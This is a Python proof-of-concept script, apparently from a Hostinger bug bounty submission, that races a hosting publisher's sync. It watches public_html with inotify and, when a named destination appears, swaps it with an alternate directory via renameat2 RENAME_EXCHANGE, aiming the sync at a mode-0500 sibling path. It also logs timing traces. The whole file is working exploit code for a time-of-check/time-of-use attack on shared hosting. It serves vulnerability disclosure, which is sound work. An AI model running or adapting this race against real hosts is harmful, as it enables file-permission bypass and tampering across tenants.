#!/usr/bin/env python3
"""Race one researcher-owned publisher destination against a mode-0500 sibling."""

from __future__ import annotations

import ctypes
import json
import os
from pathlib import Path
import stat
import struct
import sys
import time


SYS_RENAMEAT2 = 316
AT_FDCWD = -100
RENAME_EXCHANGE = 2
IN_CREATE = 0x00000100
IN_MOVED_TO = 0x00000080
MARKER = b"HOSTINGER_NODE_DESTLINK_RUNTIME_RACE:r254s"
NAME = "h1-destlink-race-r254s"
NONCE = "bugbounty-DESTLINK-RACE-20261126-r254s-b80d52a1"
libc = ctypes.CDLL(None, use_errno=True)
vhost = Path.cwd().resolve().parents[2]
public = vhost / "public_html"
destination = public / NAME
alternate = vhost / ".h1-destlink-race-swap-r254s"
sibling = vhost / "h1-destlink-race-target-r254s"
trace_path = Path.home() / ".h1-r254s-dest-race-trace.json"
started = time.monotonic()
deadline = started + 30.0
trace: dict[str, object] = {
    "authorization": "Hostinger HackerOne; researcher-owned Node vhost and nonce paths only",
    "marker": MARKER.decode(),
    "nonce": NONCE,
    "event": "not-observed",
    "targetModeDuringSync": 0o500,
}


def write_trace() -> None:
    trace_path.write_text(json.dumps(trace, sort_keys=True) + "\n")
    trace_path.chmod(0o600)


def uncaught(error_type, error, traceback) -> None:
    trace["uncaughtError"] = error_type.__name__
    trace["uncaughtMessage"] = str(error)[:240]
    trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
    try:
        write_trace()
    finally:
        sys.__excepthook__(error_type, error, traceback)


sys.excepthook = uncaught
write_trace()


def exchange(first: Path, second: Path) -> int:
    return libc.syscall(
        SYS_RENAMEAT2,
        AT_FDCWD,
        ctypes.c_char_p(os.fsencode(first)),
        AT_FDCWD,
        ctypes.c_char_p(os.fsencode(second)),
        RENAME_EXCHANGE,
    )


def shape(target: Path) -> dict[str, object]:
    try:
        st = target.lstat()
        return {
            "exists": True,
            "type": "symlink" if stat.S_ISLNK(st.st_mode) else "directory" if stat.S_ISDIR(st.st_mode) else "file" if stat.S_ISREG(st.st_mode) else "other",
            "uid": st.st_uid,
            "gid": st.st_gid,
            "mode": stat.S_IMODE(st.st_mode),
        }
    except OSError as error:
        return {"exists": False, "errorCode": error.__class__.__name__}


inotify_fd = libc.inotify_init1(os.O_NONBLOCK | os.O_CLOEXEC)
watch = -1
if inotify_fd >= 0:
    watch = libc.inotify_add_watch(inotify_fd, ctypes.c_char_p(os.fsencode(public)), IN_CREATE | IN_MOVED_TO)
trace.update(inotifyFdOk=inotify_fd >= 0, watchOk=watch >= 0)

swapped = False
if watch >= 0:
    while time.monotonic() < deadline and not swapped:
        try:
            data = os.read(inotify_fd, 4096)
        except BlockingIOError:
            time.sleep(0.00005)
            continue
        except OSError:
            data = b""
        offset = 0
        while offset + 16 <= len(data):
            _, mask, _, name_length = struct.unpack_from("iIII", data, offset)
            name_start = offset + 16
            name_end = name_start + name_length
            entry_name = data[name_start:name_end].split(b"\0", 1)[0].decode(errors="replace")
            if entry_name == NAME and mask & (IN_CREATE | IN_MOVED_TO):
                trace.update(
                    event="destination-created",
                    destinationCreatedAfterMs=round((time.monotonic() - started) * 1000, 3),
                    destinationAtEvent=shape(destination),
                    alternateAtEvent=shape(alternate),
                )
                result = exchange(destination, alternate)
                trace["exchangeErrno"] = ctypes.get_errno() if result != 0 else 0
                swapped = result == 0
                if swapped:
                    trace.update(event="destination-exchanged", destinationExchangedAfterMs=round((time.monotonic() - started) * 1000, 3))
                write_trace()
                break
            offset = name_end

trace["destinationAfterRace"] = shape(destination)
trace["alternateAfterRace"] = shape(alternate)
trace["siblingAfterRace"] = shape(sibling)
trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
if inotify_fd >= 0:
    os.close(inotify_fd)
try:
    write_trace()
except OSError:
    pass
